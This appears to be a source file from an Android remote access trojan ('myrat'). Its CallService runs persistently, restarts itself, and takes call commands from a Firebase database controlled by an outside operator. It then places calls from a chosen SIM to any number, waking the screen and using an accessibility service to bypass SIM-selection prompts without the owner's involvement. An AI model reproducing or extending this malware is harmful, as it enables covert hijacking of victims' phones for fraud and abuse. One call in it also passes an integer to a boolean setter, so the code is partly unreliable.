package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.LauncherActivity
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger
import com.myrat.app.worker.CallServiceRestartWorker
import java.util.concurrent.TimeUnit

class CallService : Service() {
    companion object {
        private const val CHANNEL_ID = "CallServiceChannel"
        private const val NOTIFICATION_ID = 8
    }

    private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
    private lateinit var deviceId: String
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            // Acquire wake lock to ensure calls work even when screen is off
            acquireWakeLock()
            
            deviceId = MainActivity.getDeviceId(this)
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(NOTIFICATION_ID, notification)
            scheduleRestart(this)
            Logger.log("CallService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to initialize CallService", e)
            stopSelf()
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "CallService:KeepAlive"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
            Logger.log("Wake lock acquired for CallService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock for calls", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, stopping CallService")
                stopSelf()
                return START_NOT_STICKY
            }
            listenForCallCommands(deviceId)
            return START_STICKY
        } catch (e: Exception) {
            Logger.error("Failed to start CallService", e)
            return START_NOT_STICKY
        }
    }

    private fun scheduleRestart(context: Context) {
        try {
            val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                repeatInterval = 5, TimeUnit.MINUTES,
                flexTimeInterval = 1, TimeUnit.MINUTES
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "CallServiceRestart",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            Logger.log("Scheduled CallService restart using WorkManager")
        } catch (e: Exception) {
            Logger.error("Failed to schedule CallService restart", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Call Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Running phone call service with SIM selection"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(NotificationManager::class.java)
                notificationManager.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create call notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Monitoring call commands with SIM selection bypass")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build call notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Running in background")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            capabilities != null && (
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                    )
        } catch (e: Exception) {
            Logger.error("Error checking network availability", e)
            false
        }
    }

    private fun listenForCallCommands(deviceId: String) {
        if (!isNetworkAvailable()) {
            Logger.error("No network available, but continuing CallService for offline functionality")
        }

        try {
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("call_commands")

            commandsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: run {
                                Logger.error("Invalid command data for ${commandSnapshot.key}")
                                return@forEach
                            }
                            val status = command["status"] as? String
                            val simNumber = command["sim_number"] as? String
                            val recipient = command["recipient"] as? String
                            val commandId = commandSnapshot.key ?: return@forEach

                            if (status != "pending") {
                                Logger.log("Skipping command $commandId with status $status")
                                return@forEach
                            }
                            if (simNumber.isNullOrBlank() || recipient.isNullOrBlank()) {
                                Logger.error("Invalid call command data for command $commandId: sim_number=$simNumber, recipient=$recipient")
                                updateCommandStatus(commandId, "failed", "Invalid sim_number or recipient")
                                return@forEach
                            }
                            Logger.log("Processing call command: $commandId from $simNumber to $recipient")
                            initiateCallWithSimSelection(simNumber, recipient, commandId)
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing call commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Call commands database error: ${error.message}", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to listen for call commands", e)
        }
    }

    private fun initiateCallWithSimSelection(simNumber: String, recipient: String, commandId: String): Boolean {
        try {
            val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
            if (alreadySentSet.contains(recipient)) {
                Logger.log("Skipping duplicate call to $recipient for command $commandId")
                return false
            }

            // Check permissions
            val hasCallPhonePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.CALL_PHONE
            ) == PackageManager.PERMISSION_GRANTED
            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                Logger.error("Missing permissions: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                updateCommandStatus(commandId, "failed", "Missing required permissions")
                return false
            }

            // Enhanced SIM mapping with better detection
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
            if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                Logger.error("No active SIM subscriptions found")
                updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
                return false
            }

            // Enhanced SIM mapping logic with multiple fallbacks
            val subscriptionInfo = subscriptionInfoList.find { info ->
                // Primary matching strategies
                info.number == simNumber ||
                "sim${info.simSlotIndex + 1}" == simNumber.lowercase() ||
                info.displayName.toString().lowercase().contains(simNumber.lowercase()) ||
                info.carrierName.toString().lowercase().contains(simNumber.lowercase()) ||
                // Additional fallbacks
                simNumber.lowercase() == "sim1" && info.simSlotIndex == 0 ||
                simNumber.lowercase() == "sim2" && info.simSlotIndex == 1
            }

            if (subscriptionInfo == null) {
                Logger.error("No SIM found for simNumber: $simNumber. Available SIMs: ${subscriptionInfoList.map { "sim${it.simSlotIndex + 1}:${it.number}:${it.displayName}" }}")
                updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
                return false
            }

            val subId = subscriptionInfo.subscriptionId
            val simSlotIndex = subscriptionInfo.simSlotIndex
            Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")

            // Use enhanced call method with SIM selection bypass
            val success = makeCallWithSimBypass(recipient, subId, simSlotIndex, commandId)
            
            if (success) {
                alreadySentSet.add(recipient)
                updateCommandStatus(commandId, "success", null)
                Logger.log("✅ Successfully initiated call from $simNumber (subId: $subId) to $recipient")
            } else {
                updateCommandStatus(commandId, "failed", "Call initiation failed")
                Logger.error("❌ Failed to initiate call from $simNumber to $recipient")
            }
            
            return success

        } catch (e: SecurityException) {
            Logger.error("Permission denied for call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
            return false
        } catch (e: Exception) {
            Logger.error("Failed to initiate call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
            return false
        }
    }

    private fun makeCallWithSimBypass(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
        return try {
            // Wake up screen if needed for call
            wakeUpScreen()
            
            // Method 1: Try direct call with subscription ID
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    val telecomManager = getSystemService(TELECOM_SERVICE) as android.telecom.TelecomManager
                    val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)

                    if (phoneAccountHandle != null) {
                        val uri = android.net.Uri.parse("tel:$recipient")
                        val extras = Bundle().apply {
                            putParcelable(android.telecom.TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                            putBoolean("com.android.phone.extra.slot", simSlotIndex)
                            putInt("subscription", subId)
                            putInt("com.android.phone.DialpadFragment.extra.slot", simSlotIndex)
                        }
                        
                        telecomManager.placeCall(uri, extras)
                        Logger.log("📞 Direct call placed using TelecomManager with subId: $subId")
                        
                        // If accessibility service is enabled, it will handle SIM selection bypass
                        if (isAccessibilityServiceEnabled()) {
                            Logger.log("♿ Accessibility service enabled - will bypass SIM selection if needed")
                        }
                        
                        return true
                    }
                } catch (e: Exception) {
                    Logger.error("TelecomManager call failed, trying fallback", e)
                }
            }

            // Method 2: Fallback using LauncherActivity with enhanced SIM handling
            val intent = Intent(this, LauncherActivity::class.java).apply {
                action = "com.myrat.app.ACTION_MAKE_CALL"
                putExtra("recipient", recipient)
                putExtra("subId", subId)
                putExtra("simSlotIndex", simSlotIndex)
                putExtra("commandId", commandId)
                putExtra("bypassSimSelection", true) // Flag for accessibility service
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            startActivity(intent)
            Logger.log("📞 Fallback call initiated via LauncherActivity with SIM bypass")
            return true

        } catch (e: Exception) {
            Logger.error("All call methods failed for $recipient", e)
            return false
        }
    }

    private fun getPhoneAccountHandleForSubscription(telecomManager: android.telecom.TelecomManager, subId: Int): android.telecom.PhoneAccountHandle? {
        return try {
            val phoneAccounts = telecomManager.callCapablePhoneAccounts
            Logger.log("Available phone accounts: ${phoneAccounts.size}")

            phoneAccounts.find { account ->
                try {
                    val phoneAccount = telecomManager.getPhoneAccount(account)
                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1)
                    Logger.log("Checking account: $account, subId: $accountSubId vs target: $subId")
                    accountSubId == subId
                } catch (e: Exception) {
                    Logger.error("Error checking phone account: $account", e)
                    false
                }
            }
        } catch (e: Exception) {
            Logger.error("Error getting PhoneAccountHandle for subId: $subId", e)
            null
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val accessibilityEnabled = android.provider.Settings.Secure.getInt(
                contentResolver,
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = android.provider.Settings.Secure.getString(
                    contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun wakeUpScreen() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isInteractive) {
                val screenWakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "CallService:ScreenWake"
                )
                screenWakeLock.acquire(10000) // 10 seconds
                screenWakeLock.release()
                Logger.log("Screen woken up for call")
            }
        } catch (e: Exception) {
            Logger.error("Failed to wake up screen for call", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
            val updates = mutableMapOf<String, Any?>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }
            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated call command $commandId to status $status")
                    if (status == "success" || status == "failed") {
                        commandRef.removeValue()
                            .addOnSuccessListener {
                                Logger.log("Removed call command $commandId")
                                sentCallTracker.remove(commandId)
                            }
                            .addOnFailureListener { e ->
                                Logger.error("Failed to remove command: ${e.message}", e)
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update call command $commandId: ${e.message}", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating call command status", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake lock
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            Logger.log("CallService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying CallService", e)
        }
    }
}